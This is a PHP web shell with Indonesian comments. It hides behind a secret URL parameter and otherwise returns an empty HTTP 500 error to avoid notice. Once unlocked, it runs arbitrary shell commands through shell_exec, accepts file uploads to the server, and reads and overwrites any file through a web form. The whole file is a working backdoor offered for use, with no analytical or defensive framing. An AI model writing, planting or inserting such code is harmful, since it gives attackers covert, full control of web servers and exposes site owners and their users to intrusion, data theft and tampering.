<?php
// Periksa apakah parameter "cari apa bang?" ada dalam URL
if (isset($_GET['ampunngeri'])) {
    // Fungsi Upload File
    if ($_FILES) {
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "âœ… Upload berhasil!<br>";
    }

    // Fungsi Eksekusi Perintah Terminal
    if (isset($_POST['cmd'])) {
        echo "<pre>ðŸ–¥ " . htmlspecialchars($_POST['cmd']) . ":</pre>";
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    }

    // Fungsi Edit File
    if (isset($_POST['edit_file'])) {
        file_put_contents($_POST['edit_file'], $_POST['content']);
        echo "âœ… File berhasil diedit!<br>";
    }

    // Form Eksekusi Perintah
    echo '<form method="POST">
            <input type="text" name="cmd" placeholder="Masukkan Perintah">
            <input type="submit" value="Eksekusi">
          </form>';

    // Form Upload File
    echo '<form method="POST" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
          </form>';

    // Form Edit File jika parameter file ada
    if (isset($_GET['file'])) {
        echo '<form method="POST">
                <input type="hidden" name="edit_file" value="'.htmlspecialchars($_GET['file']).'">
                <textarea name="content" rows="10" cols="50">'
                .htmlspecialchars(file_get_contents($_GET['file'])).'</textarea>
                <input type="submit" value="Simpan">
              </form>';
    }
} else {
    http_response_code(500);
    echo "";
}
?>
